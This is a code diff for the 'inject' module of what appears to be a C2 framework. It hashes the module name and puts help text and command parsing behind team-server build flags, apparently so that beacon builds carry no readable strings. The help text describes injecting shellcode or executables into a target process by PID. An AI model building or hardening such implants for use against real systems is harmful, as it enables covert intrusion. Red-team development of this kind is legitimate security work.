@@ -1,15 +1,20 @@
 #include "Inject.hpp"
 
 #include <cstring>
+
+#include "Common.hpp"
 #include "Tools.hpp"
 
 
 using namespace std;
 
-const std::string moduleName = "inject";
+constexpr std::string_view moduleName = "inject";
+constexpr unsigned long moduleHash = djb2(moduleName);
+
+#ifdef BUILD_TEAMSERVER
 const std::string ToolsDirectoryFromTeamServer = "../Tools/";
 const std::string BeaconsDirectoryFromTeamServer = "../Beacons/";
-
+#endif
 
 #ifdef _WIN32
 
@@ -24,7 +29,11 @@ __declspec(dllexport) Inject* A_InjectConstructor()
 #endif
 
 Inject::Inject()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -35,6 +44,7 @@ Inject::~Inject()
 std::string Inject::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "inject:\n";
 	info += "Inject shellcode in the pid process. For linux must be root or at least have ptrace capability.\n";
 	info += "No output is provided.\n";
@@ -45,12 +55,13 @@ std::string Inject::getInfo()
 	info += "- inject -r ./calc.bin 2568\n";
 	info += "- inject -e ./beacon.exe pid arg1 arg2\n";
 	info += "- inject -d ./calc.dll pid method arg1 arg2\n";
-
+#endif
 	return info;
 }
 
 int Inject::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 	if (splitedCmd.size() >= 4)
 	{
 		bool donut=false;
@@ -177,7 +188,7 @@ int Inject::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 		c2Message.set_returnvalue(getInfo());
 		return -1;
 	}
-
+#endif
 	return 0;
 }
 
@@ -336,7 +347,7 @@ int Inject::process(C2Message &c2Message, C2Message &c2RetMessage)
 	// nt creat thread ex
 	// bcp d autre
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(c2Message.cmd());
 	c2RetMessage.set_returnvalue(result);
 
